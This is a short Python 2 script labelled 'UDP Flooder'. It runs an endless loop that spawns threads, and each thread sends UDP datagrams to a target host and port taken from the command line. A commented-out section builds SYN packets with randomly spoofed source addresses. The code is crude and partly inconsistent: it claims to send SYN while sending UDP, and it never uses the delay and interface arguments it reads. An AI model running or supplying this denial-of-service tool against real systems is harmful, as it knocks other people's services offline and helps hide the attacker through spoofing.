#!/usr/bin/env python
#
# UDP Flooder
#
# Date: Oct. 22, 2012
# All rights reserved.
#

import socket,sys,threading
import threading,time
#import scapy,random

class sendUDP(threading.Thread):
	def __init__(self, id, name, target, port):
		self.threadID = id
		self.name = name
		self.target = target
		self.port = port
		threading.Thread.__init__(self)
	def run(self):
		print "Starting %s %s %d" % (self.name, self.target, self.port)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto("*", (self.target, self.port))
		received = sock.recv(1024)
		print "Received:", received
#		i = scapy.IP() 
#		i.src="%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1,254), random.randint(1, 254), random.randint(1,254))
#		i.dst = target
#		t = scapy.TCP()
#		t.dport = port
#		t.flags='S'
#		scapy.send(i/t,verbose=0)
#		sock.sendto("hello, srv", (target,port))
		
def floodudp(target, port, thds):
	total = 0
	print "Flooding %s:%i with SYN" % (target, port)
	#scapy.conf.iface=inf
	while 1:
		if threading.activeCount() < thds:
			sd = sendUDP(total, "Thread-" + str(total), target, port)		
			sd.start()
			total += 1
		#sys.stdout.write("\rTotal packet sent: \t\t\t%i\n" % total)

if __name__ == "__main__":
	if len(sys.argv) != 6:
		print "Usage: %s <target> <port> <if> <delay> <num_threads>" % sys.argv[0]
		sys.exit(1)
	target=sys.argv[1]
	port=int(sys.argv[2])
	inf = sys.argv[3]
	delay=int(sys.argv[4])
	thds=int(sys.argv[5])
	floodudp(target, port, thds)	

